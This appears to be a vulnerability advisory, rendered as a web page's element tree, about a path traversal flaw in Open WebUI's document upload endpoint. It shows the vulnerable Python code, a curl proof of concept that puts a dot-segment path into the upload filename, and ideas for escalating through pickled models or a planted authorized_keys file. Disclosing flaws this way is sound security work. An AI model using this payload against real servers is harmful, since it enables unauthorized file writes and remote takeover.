              - separator [ref=e165]
              - heading "4. High-level Summary" [level=2] [ref=e166]
              - paragraph [ref=e167]: Attacker controlled files can be uploaded to arbitrary locations on the web server's filesystem by abusing a path traversal vulnerability.
              - separator [ref=e168]
              - heading "11. Technical Analysis" [level=2] [ref=e169]
              - paragraph [ref=e170]: When attaching files to a prompt by clicking the plus sign (+) on the left of the message input box when using the Open WebUI HTTP interface, the file is uploaded to a static upload directory.
              - paragraph [ref=e171]: The name of the file is derived from the original HTTP upload request and is not validated or sanitized. This allows for users to upload files with names containing dot-segments in the file path and traverse out of the intended uploads directory. Effectively, users can upload files anywhere on the filesystem the user running the web server has permission.
              - paragraph [ref=e172]:
                - text: This can be visualized by examining the python code for the
                - code [ref=e173]: /rag/api/v1/doc
                - text: "API route:"
              - generic [ref=e175]:
                - generic [ref=e176]: "@app.post(\"/doc\")"
                - text: "def store_doc( collection_name: Optional[str] = Form(None), file: UploadFile = File(...), user=Depends(get_current_user), ): # \"https://www.gutenberg.org/files/1727/1727-h/1727-h.htm\" print(file.content_type) try: filename = file.filename file_path ="
                - generic [ref=e177]:
                  - text: f"
                  - generic [ref=e178]: "{UPLOAD_DIR}"
                  - text: /
                  - generic [ref=e179]: "{filename}"
                  - text: "\""
                - text: "contents = file.file.read() with open(file_path, \"wb\") as f: f.write(contents) f.close()"
              - paragraph [ref=e180]:
                - text: The
                - code [ref=e181]: file
                - text: variable is a representation of the multipart form data contained within the HTTP POST request. The
                - code [ref=e182]: filename
                - text: variable is derived from the uploaded file name and is not validated before writing the file contents to disk.
              - paragraph [ref=e183]:
                - text: This can be used to upload malicious models. These models are often distributed as pickled python objects and can be leveraged to execute arbitrary python bytecode once deserialized. Alternatively, an attacker can leverage existing services, such as SSH, to upload an attacker controlled
                - code [ref=e184]: authorized_keys
                - text: file to remotely connect to the machine.
              - separator [ref=e185]
              - heading "12. Proof-of-Concept" [level=2] [ref=e186]
              - paragraph [ref=e187]: "Execute the following cURL command:"
              - generic [ref=e189]:
                - text: TARGET_URI=
                - generic [ref=e190]: "'https://redacted.com'"
                - text: ; JWT=
                - generic [ref=e191]: "'redacted'"
                - text: ; LOCAL_FILE=
                - generic [ref=e192]: "'/tmp/file_to_upload.txt'"
                - text: \ curl -H
                - generic [ref=e193]: "\"Authorization: Bearer $JWT\""
                - text: "-F"
                - generic [ref=e194]: "\"file=$LOCAL_FILE;filename=../../../../../../../../../../tmp/pwned.txt\""
                - generic [ref=e195]: "\"$TARGET_URI/rag/api/v1/doc\""
              - paragraph [ref=e196]:
                - text: Verify the file
                - code [ref=e197]: pwned.txt
                - text: exists in the
                - code [ref=e198]: /tmp/
                - text: "directory on the machine hosting the web server:"
              - generic [ref=e200]: ollama@webserver:~$ cat /tmp/pwned.txt korelogic ollama@webserver:~$
